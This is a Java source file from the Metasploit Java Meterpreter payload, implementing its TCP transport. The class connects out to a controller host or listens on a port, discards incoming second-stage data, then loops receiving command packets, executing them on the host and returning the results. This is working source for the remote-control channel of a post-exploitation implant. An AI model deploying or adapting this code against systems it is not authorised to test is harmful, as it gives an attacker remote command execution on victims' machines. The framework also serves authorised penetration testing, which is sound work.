package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

import com.metasploit.meterpreter.command.Command;

public class TcpTransport extends Transport {
    private Socket sock = null;
    private DataInputStream inputStream = null;
    private DataOutputStream outputStream = null;
    private String host;
    private int port;

    public TcpTransport(String url) {
        super(url);

        int portStart = url.lastIndexOf(":");
        this.port = Integer.parseInt(url.substring(portStart + 1));
        this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
        System.out.println("msf : Host: " + this.host);
        System.out.println("msf : Port: " + this.port);
    }

    public void bind(DataInputStream in, OutputStream rawOut) {
        this.inputStream = in;
        this.outputStream = new DataOutputStream(rawOut);
    }

    public int parseConfig(byte[] configuration, int offset) {
        return this.parseTimeouts(configuration, offset);
    }

    public void disconnect() {
        if (this.inputStream != null) {
            try {
                this.inputStream.close();
            }
            catch (IOException ex) {
            }
            this.inputStream = null;
        }
        if (this.outputStream != null) {
            try {
                this.outputStream.close();
            }
            catch (IOException ex) {
            }
            this.outputStream = null;
        }
        if (this.sock != null) {
            try {
                this.sock.close();
            }
            catch (IOException ex) {
            }
            this.sock = null;
        }
    }

    protected boolean tryConnect(Meterpreter met) throws IOException {
        if (this.inputStream != null) {
            // we're already connected
            System.out.println("msf : Connecting on existing transport");
            return true;
        }

        if (this.host.equals("")) {
            ServerSocket server = new ServerSocket(this.port);
            this.sock = server.accept();
            server.close();
        } else {
            this.sock = new Socket(this.host, this.port);
        }

        if (this.sock != null) {
            this.sock.setSoTimeout(500);
            this.inputStream = new DataInputStream(this.sock.getInputStream());
            this.outputStream = new DataOutputStream(this.sock.getOutputStream());

            // this point we are effectively stageless, so flush the socket
            this.flushInputStream();

            return true;
        }

        return false;
    }

    public TLVPacket readPacket() throws IOException {
        int len = this.inputStream.readInt();
        int type = this.inputStream.readInt();
        return new TLVPacket(this.inputStream, len - 8);
    }

    public void writePacket(TLVPacket packet, int type) throws IOException {
        byte[] data = packet.toByteArray();
        synchronized (this.outputStream) {
            System.out.println("msf : sending response");
            this.outputStream.writeInt(data.length + 8);
            this.outputStream.writeInt(type);
            this.outputStream.write(data);
            this.outputStream.flush();
            System.out.println("msf : sent response");
        }
    }

    public boolean dispatch(Meterpreter met) {
        System.out.println("msf : In the dispatch loop");
        long lastPacket = System.currentTimeMillis();
        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                System.out.println("msf : Waiting for packet");
                TLVPacket request = this.readPacket();

                if (request == null) {
                    continue;
                }

                System.out.println("msf : Packet received");

                // got a packet, update the timestamp
                lastPacket = System.currentTimeMillis();

                TLVPacket response = request.createResponse();
                int result = met.getCommandManager().executeCommand(met, request, response);

                this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                if (result == Command.EXIT_DISPATCH) {
                    return true;
                }
            } catch (SocketTimeoutException ex) {
                // socket comms timeout, didn't get a packet,
                // this is ok, so we ignore it
                System.out.println("msf : Socket timeout (OK)");
            } catch (Exception ex) {
                // any other type of exception isn't good.
                System.out.println("msf : Some other exception: " + ex.getClass().getName());
                break;
            }
        }

        // if we get here we assume things aren't good.
        return false;
    }

    private void flushInputStream() throws IOException {
        // we can assume that the server is trying to send the second
        // stage at this point, so let's just read that in for now.
        System.out.println("msf : Flushing the input stream");
        // this includes 4 blobs of stuff we don't want
        for (int i = 0; i < 4; i++) {
            System.out.println("msf : Flushing the input stream: " + i);
            int blobLen = this.inputStream.readInt();
            System.out.println("msf : Discarding bytes: " + blobLen);
            byte[] throwAway = new byte[blobLen];
            this.inputStream.readFully(throwAway);
        }
    }
}
